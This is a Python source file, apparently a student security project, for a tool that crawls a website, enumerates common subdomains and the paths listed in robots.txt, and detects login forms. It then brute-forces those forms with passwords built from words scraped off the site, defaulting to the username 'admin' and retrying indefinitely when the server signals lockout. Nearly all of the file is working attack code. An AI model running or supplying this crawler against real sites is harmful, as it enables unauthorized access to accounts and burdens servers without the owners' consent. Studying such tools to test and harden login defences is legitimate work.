from html_parser import HTMLParser
from password_generator import generate_all_passwords
from requests import get_request, get_status, post_request
from time import sleep
from url_utils import extract_url_parts, reformat_url

import argparse
import collections
import socket

SUBDOMAINS_FILE_PATH = './subdomains-100.txt'

class Node:
    def __init__(self, url, depth):
        self.url = url
        self.depth = depth

class Counter:
    def __init__(self, count, max_depth, page_max):
        self.count = count
        self.max_depth = max_depth
        self.page_max = page_max

def add_duplicate_url(url, seen):
    # If the URL has a trailing slash, add the URL without the slash to set of seen nodes
    if url[-1] == '/':
        seen.add(url[:-1])
        
    # Else the URL doesn't have a trailing slash and add the URL with a slash to set of seen nodes
    else:
        seen.add(url + '/')       

def process_node(start_url, node, header_dict, forms, keywords, seen, add_next, counter):
    if counter.count >= counter.page_max:
        return
    
    # Make GET request to the current URL      
    html_doc = get_request(node.url, header_dict)
    if html_doc is not None:
        print('Depth ' + str(node.depth) + ': Processing: ' + node.url)
        counter.count += 1

        parser = HTMLParser(html_doc)

        # Extract and add words from current page to the set of keywords
        keywords |= parser.extract_words()

        # If a login form is found, add it to the set
        form_found = parser.detect_login_form()
        if form_found:
            forms.add(node.url)

        # Add reachable URLs from current node if its depth < max depth
        if node.depth < counter.max_depth:
            # Retrieve set of URLs reachable from current node 
            linked_urls = parser.extract_urls()

            for url in linked_urls:
                # Reformat if relative url given
                if 'http' not in url:
                    url = reformat_url(url, node.url)                 

                if url not in seen and url.startswith(start_url):
                    seen.add(url)
                    add_duplicate_url(url, seen)
                    # Traversal dependent function to add next node
                    add_next(url) 
    else:
        print('4xx/5xx error at: ' + node.url)

def crawl_bfs(start_url, header_dict, counter, forms, keywords, seen):
    queue = collections.deque()

    if counter.count >= counter.page_max:
        print('\nCrawling Aborted: The maximum number of pages of ' + str(counter.page_max) + ' has been reached!')
    else:
        print('\nStarting Breadth-First Crawling')
        print('-' * 50)
        
        # Add start URL to the queue and set of seen URLs
        start_node = Node(start_url, 0)
        queue.append(start_node)
        seen.add(start_node.url)
        add_duplicate_url(start_node.url, seen)

        # While queue is not empty
        while queue:
            node = queue.popleft()
            add_to_queue = lambda url: queue.append(Node(url, node.depth + 1))  
            process_node(start_url, node, header_dict, forms, keywords, seen, add_to_queue, counter)

            if counter.count >= counter.page_max:
                print('\nCrawling Aborted: The maximum number of pages of ' + str(counter.page_max) + ' has been reached!')
                return

def crawl_dfs(start_url, header_dict, counter, forms, keywords, seen):
    """ Wrapper function to initialize first call to recursive DFS crawl function """ 

    if counter.count >= counter.page_max:
        print('\nCrawling Aborted: The maximum number of pages of ' + str(counter.page_max) + ' has been reached!')
    else:
        print('\nStarting Depth-First Crawling')
        print('-' * 50)    
        start_node = Node(start_url, 0)
        # Add start URL to the set of seen URLs
        seen.add(start_node.url)
        add_duplicate_url(start_node.url, seen)
        
        _crawl_dfs(start_url, start_node, header_dict, forms, keywords, seen, counter)

def _crawl_dfs(start_url, node, header_dict, forms, keywords, seen, counter):
    if counter.count >= counter.page_max:
        print('\nCrawling Aborted: The maximum number of pages of ' + str(counter.page_max) + ' has been reached!')
        return
    add_to_stack = lambda url: _crawl_dfs(start_url, Node(url, node.depth + 1), header_dict, forms, keywords, seen, counter)
    process_node(start_url, node, header_dict, forms, keywords, seen, add_to_stack, counter) 

def read_subdomains():
    with open(SUBDOMAINS_FILE_PATH, "r") as f:
        return {subdomain.rstrip() for subdomain in f}

def get_subdomains(url):
    subdomains = read_subdomains()
    host, _, _ = extract_url_parts(url)
    
    url_subdomain = host.split('.')[0] # Subdomain of given URL
    
    # Check to see if the URL already has a subdomain from the list
    if url_subdomain in subdomains:
        host = host.replace(url_subdomain + '.', '')

    return {subdomain + '.' + host for subdomain in subdomains if subdomain != url_subdomain}

def crawl_subdomains(bfs, url, header_dict, counter, forms, keywords, seen):
    print('\nCrawling Subdomains')
    print('-' * 50)    
    for subdomain in get_subdomains(url):
        try:
            conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # Test whether subdomain exists 
            conn.connect((subdomain, 80))
            subdomain = reformat_url(subdomain)
            print('\nCrawling Subdomain: ' + subdomain)
            if bfs:
                crawl_bfs(subdomain, header_dict, counter, forms, keywords, seen)
            else:
                crawl_dfs(subdomain, header_dict, counter, forms, keywords, seen)            
        except socket.gaierror:
            print('\nSubdomain ' + subdomain + ' was not found.')
        finally:
            conn.close()    

def crawl_robots(bfs, url, header_dict, counter, forms, keywords, seen):
    # If url doesnt end with /robots.txt or robots.txt/ then append and call, otherwise call just url
    robots_url = ''
    if url.endswith('robots.txt') or url.endswith('robots.txt/'):
        robots_url = url
    else:
        if url.endswith('/'):
            robots_url = url + 'robots.txt'
        else:
            robots_url = url + '/robots.txt'

    try:
        print('\nTrying robots link: {}'.format(robots_url))
        textfile = get_request(robots_url, {})
    except socket.gaierror:
        print('\nCould not find {}'.format(robots_url))
        return
    split_text = textfile.split('\n')
    allow_disallow = list(filter(lambda x: x.startswith('Disallow:') or x.startswith('Allow:'), split_text))
    new_links = list(map(lambda x: x.split(' ')[1], allow_disallow))
    appended_links = list(map(lambda x: '{}{}'.format(url, x), new_links))
    for link in appended_links:
        if link not in seen:
            try:
                if bfs:
                    crawl_bfs(link, header_dict, counter, forms, keywords, seen)
                else:
                    crawl_dfs(link, header_dict, counter, forms, keywords, seen)
            except socket.gaierror:
                print('\nCould not find {}'.format(link))
            
def brute_force(user, keywords, forms, user_agent):
    passwords = generate_all_passwords(keywords)
    results = {}
    for form in forms:
        print('\nAttempting to brute-force: ' + form + '\n')
        get_header = {'User-Agent': user_agent}
        html_doc = get_request(form, get_header)
        parser = HTMLParser(html_doc)
        done = False

        for password in passwords:
            if not done:
                login = parser.create_login_string(user, password)
                post = {'User-Agent': user_agent,
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Content-Length': str(len(login))}

                response = post_request(form, post, login)
                
                if get_status(response) >= 500:
                    print('\nHold on, too many failed attempts! Waiting for the server to accept more login requests...\n')
                
                # Continually retry logging in if there is a server error (too many failed attempts)
                while get_status(response) >= 500:
                    response = post_request(form, post, login)

                combination = 'User: ' + user + '\nPassword: ' + password
                print('Attempting to login...\n' + combination)

                if get_status(response) == 302:
                    print('Login Succeeded!\n')
                    done = True
                    results[form] = combination
                else:
                    print('Login Failed...\n')
        
        if not done:
            print('Ran out of passwords! Bruteforce failed!')
            results[form] = None
        
        sleep(5) # Temporary pause between forms to see end result of the current form
    
    # Print bruteforce results
    print('Bruteforcer Results')
    print('-' * 50)
    for form, combination in results.items():
        print('Form: ' + form)
        if combination is None:
            print('Bruteforce Failed')
        else:
            print(combination)
       
def main():
    parser = argparse.ArgumentParser(description='Arguments to proceed web-crawling')
    parser.add_argument('-url', nargs=1, type=str, help='URL', required=True)
    parser.add_argument('--username', nargs=1, type=str, help='Username')
    parser.add_argument('--maxdepth', nargs=1, type=int, help='Max Depth to Crawl')
    parser.add_argument('--maxpages', nargs=1, type=int, help='Max Pages to Crawl')
    parser.add_argument('--mode', nargs=1, type=str, help='Mode of Crawling : "bfs" or "dfs"')
    parser.add_argument('--useragent', nargs=1, type=str, help='User Agent')
    args = parser.parse_args()

    modes = [['bfs'], ['dfs']]

    url = reformat_url(args.url.pop())
    username = 'admin' if args.username is None else args.username.pop()
    max_depth = 10 if args.maxdepth is None else args.maxdepth.pop()
    max_pages = 10 if args.maxpages is None else args.maxpages.pop()
    mode = args.mode.pop() if args.mode in modes else 'bfs'

    if (args.useragent is not None):
        user_agent = args.useragent.pop()
        header_dict = {'User-Agent': user_agent}
    else:
        user_agent = 'N/A'
        header_dict = {}

    print('Initiating web crawl with following configuration')
    print('Algorithm: {}, Username: {}, Max Pages: {}, Max Page Depth: {}, User Agent: {}'.format(mode, username, max_pages, max_depth, user_agent))

    page_counter = Counter(0, max_depth, max_pages)

    forms = set()
    keywords = set()
    seen = set()

    if mode == 'bfs':
        """
        BFS
        """  
        crawl_bfs(url, header_dict, page_counter, forms, keywords, seen)
        crawl_subdomains(True, url, header_dict, page_counter, forms, keywords, seen)      
        crawl_robots(True, url, header_dict, page_counter, forms, keywords, seen)
        
    elif mode == 'dfs':
        """
        DFS
        """
        crawl_dfs(url, header_dict, page_counter, forms, keywords, seen)
        crawl_subdomains(False, url, header_dict, page_counter, forms, keywords, seen)
        crawl_robots(False, url, header_dict, page_counter, forms, keywords, seen)
    
    brute_force(username, keywords, forms, user_agent)

if __name__ == '__main__':
    main()